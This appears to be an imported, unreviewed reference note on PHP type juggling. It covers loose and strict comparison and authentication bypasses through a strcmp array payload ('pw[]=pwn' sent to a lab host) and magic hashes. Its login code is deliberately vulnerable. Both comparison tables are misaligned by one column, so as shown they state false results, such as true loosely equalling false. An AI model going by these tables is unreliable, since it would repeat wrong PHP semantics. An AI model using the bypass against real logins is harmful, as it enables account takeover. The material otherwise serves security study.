---
technique: "Type Juggling"
family: "auth-session"
severity_hint: "high"
tags: ["PHP", "Account Takeover", "Authentication", "HTTP", "Session Tokens"]
source: "_raw/Web attacks/Web Attacks/Type Juggling.md"
curator_version: 2
review_status: imported-unreviewed
---

# Type Juggling

> Family: **auth-session** · Severity hint: **high** · Tags: PHP, Account Takeover, Authentication, HTTP, Session Tokens
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Overview

In PHP, [type juggling](https://www.php.net/manual/en/language.types.type-juggling.php) is an internal behavior that results in the conversion of variables to other data types in certain contexts, such as comparisons. While this is not inherently a security vulnerability, it can result in unexpected or undesired outcomes, resulting in security vulnerabilities depending on the concrete web application — most notably authentication bypasses when a loose (`==`) comparison is used where a strict (`===`) one was intended.

```php
$a = 42;
$b = "42";

// loose comparison
if ($a == $b) { echo "Loose Comparison";}

// strict comparison
if ($a === $b) { echo "Strict Comparison";}
```

| **Operand 1** | **Operand 2** | **Behavior** |
| --- | --- | --- |
| `string` | `string` | Numerical or lexical comparison |
| `null` | `string` | Convert `null` to `""` |
| `null` | anything but `string` | Convert both sides to `bool` |
| `bool` | anything | Convert both sides to `bool` |
| `int` | `string` | Convert `string` to `int` |
| `float` | `string` | Convert `string` to `float` |

For example, consider the comparison `1 == "1HelloWorld"` which evaluates to `true`. Since the first operand is an `int` and the second operand is a `string`, PHP converts the string to an integer. When converting `"1HelloWorld"` to an integer, the result is `1`. Thus, the comparison evaluates to true after type juggling.

Loose compare:

|  | **`false`** | **`1`** | **`0`** | **`-1`** | **`"1"`** | **`"0"`** | **`"-1"`** | **`null`** | **`[]`** | **`"php"`** | **`""`** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| `true` | ✓ | ✗ | ✓ | ✗ | ✓ | ✓ | ✗ | ✓ | ✗ | ✗ | ✓ |
| `false` | ✗ | ✓ | ✗ | ✓ | ✗ | ✗ | ✓ | ✗ | ✓ | ✓ | ✗ |
| `1` | ✓ | ✗ | ✓ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `0` | ✗ | ✓ | ✗ | ✓ | ✗ | ✗ | ✓ | ✗ | ✓ | ✗ | ✓ (< PHP 8.0.0) |
| `-1` | ✓ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ |
| `"1"` | ✓ | ✗ | ✓ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `"0"` | ✗ | ✓ | ✗ | ✓ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ |
| `"-1"` | ✓ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ |
| `null` | ✗ | ✓ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✓ | ✓ | ✗ |
| `[]` | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ | ✓ | ✗ |
| `"php"` | ✓ | ✗ | ✗ | ✓ (< PHP 8.0.0) | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ |
| `""` | ✗ | ✓ | ✗ | ✓ (< PHP 8.0.0) | ✗ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ |

Strict compare:

| **`true`** | **`false`** | **`1`** | **`0`** | **`-1`** | **`"1"`** | **`"0"`** | **`"-1"`** | **`null`** | **`[]`** | **`"php"`** | **`""`** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| `true` | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `false` | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `1` | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `0` | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `-1` | ✗ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `"1"` | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `"0"` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ |
| `"-1"` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ |
| `null` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ |
| `[]` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ | ✗ |
| `"php"` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✓ |
| `""` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |

## Auth Bypass

### **Strcmp Bypass**

- The function [strcmp](https://www.php.net/manual/en/function.strcmp.php) returns `0` if the two compared strings are equal
- If we supply a variable of the data type `array`, the function `strcmp` returns `null`, resulting in the comparison `null == 0`, which is `true` after type juggling

```php
$admin_pw = "P@ssw0rd!";

if(isset($_POST['pw'])){
    if(strcmp($_POST['pw'], $admin_pw) == 0){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```

```python
POST / HTTP/1.1
Host: typejuggling.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

pw[]=pwn
```

<aside>
💡

Note: The behavior of `strcmp` was changed in PHP 8.0.0 to throw an error if any argument is not a string. Thus, the bypass only works in PHP versions prior to 8.0.0.

</aside>

### **Magic Hashes**

```php
$hashed_password = '0e66298694359207596086558843543959518835691168370379069085301337';

if(isset($_POST['pw']) and is_string($_POST['pw'])){
    if(hash('sha256', $_POST['pw']) == $hashed_password){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```

## Source
- `_raw/Web attacks/Web Attacks/Type Juggling.md`
- `_raw/Web attacks/Web Attacks/Type Juggling/Introduction to Type Juggling.md`
- `_raw/Web attacks/Web Attacks/Type Juggling/Authentication Bypass.md`
